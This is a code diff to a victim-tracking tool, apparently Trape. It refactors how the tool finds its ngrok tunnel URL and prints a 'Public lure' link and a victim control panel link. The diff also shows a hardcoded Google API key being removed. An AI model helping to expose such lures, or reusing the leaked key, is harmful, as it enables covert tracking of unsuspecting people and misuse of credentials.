@@ -14,8 +14,8 @@
 import time
 import json
 import urllib
-from core.dependence import urllib2
-import http.client 
+import urllib.request
+import http.client
 import argparse
 import socket
 import sys
@@ -188,28 +188,25 @@ class Trape(object):
 			utils.Go(utils.Color['white'] + "\t" + utils.Color['green'] + ">" + utils.Color['white'] + "-" + utils.Color['blue'] + "=" + utils.Color['white'] + "["  + utils.Color['white'] + " Your Access key: " + utils.Color['blue'] + self.stats_key + utils.Color['white'])
 			utils.Go("")
 			if self.ngrok != '':
-				if self.googl == '':
-					self.googl = 'AIzaSyCPzcppCT27KTHnxAIQvYhtvB_l8sKGYBs'
 				try:
-					opener = urllib.request.build_opener()
-					pLog = 4040
-					ngrokStatus = str(opener.open('http://127.0.0.1:' + str(pLog) + '/api/tunnels').read()).replace('\n', '').replace(' ', '')
-					time.sleep(0.5)
-					ngrokUrlPos = ngrokStatus.find('ngrok.io')
-					if ngrokUrlPos <= 0:
-						time.sleep(4)
-						ngrokStatus = str(opener.open('http://127.0.0.1:' + str(pLog) + '/api/tunnels').read()).replace('\n', '').replace(' ', '')
-						ngrokUrlPos = ngrokStatus.find('ngrok.io')
-					if ngrokUrlPos >= 0:
-						ngrokStatus = ngrokStatus[ngrokUrlPos-25:ngrokUrlPos+28]
-						ngrokUrlPos = ngrokStatus.find('http')
-						ngrokUrlPos2 = ngrokStatus.find('.io')
-						ngrokStatus = ngrokStatus[ngrokUrlPos: ngrokUrlPos2] + '.io'
+					ngrok_api = 'http://127.0.0.1:4040/api/tunnels'
+					public_url = ''
+					# Give ngrok time to establish the tunnel and expose its local API
+					for _ in range(8):
+						try:
+							raw_tunnels = urllib.request.urlopen(ngrok_api, timeout=4).read()
+							public_url = utils.parseNgrokTunnels(raw_tunnels)
+						except Exception:
+							public_url = ''
+						if public_url:
+							break
+						time.sleep(2)
+					if public_url != '':
+						self.nGrokUrl = public_url
 						utils.Go(utils.Color['white'] + "\t" + utils.Color['whiteBold'] + "PUBLIC INFORMATION" + utils.Text['end'])
 						utils.Go("\t" + "-------------------")
-						self.nGrokUrl = ngrokStatus.replace('https', 'http')
 						utils.Go(utils.Color['white'] + "\t" + utils.Color['yellow'] + ">" + utils.Color['white'] + "-" + utils.Color['blue'] + "=" + utils.Color['white'] + "["  + utils.Color['white'] + " Public lure: " + utils.Color['blue'] + self.nGrokUrl + '/' + self.victim_path + utils.Color['white'])
-						utils.Go(utils.Color['white'] + "\t" + utils.Color['yellow'] + ">" + utils.Color['white'] + "-" + utils.Color['blue'] + "=" + utils.Color['white'] + "["  + utils.Color['white'] + " Control Panel link: " + utils.Color['blue'] + ngrokStatus.replace('https', 'http') + '/' + self.stats_path + utils.Color['white'])
+						utils.Go(utils.Color['white'] + "\t" + utils.Color['yellow'] + ">" + utils.Color['white'] + "-" + utils.Color['blue'] + "=" + utils.Color['white'] + "["  + utils.Color['white'] + " Control Panel link: " + utils.Color['blue'] + self.nGrokUrl + '/' + self.stats_path + utils.Color['white'])
 					else:
 						utils.Go(utils.Color['red'] + "\t" + utils.Color['green'] + "-" + utils.Color['white'] + "--" + utils.Color['red'] + "=" + utils.Color['white'] + "["  + utils.Color['white'] + " We can't connect with nGrok " + utils.Color['white'])
 				except Exception as e:
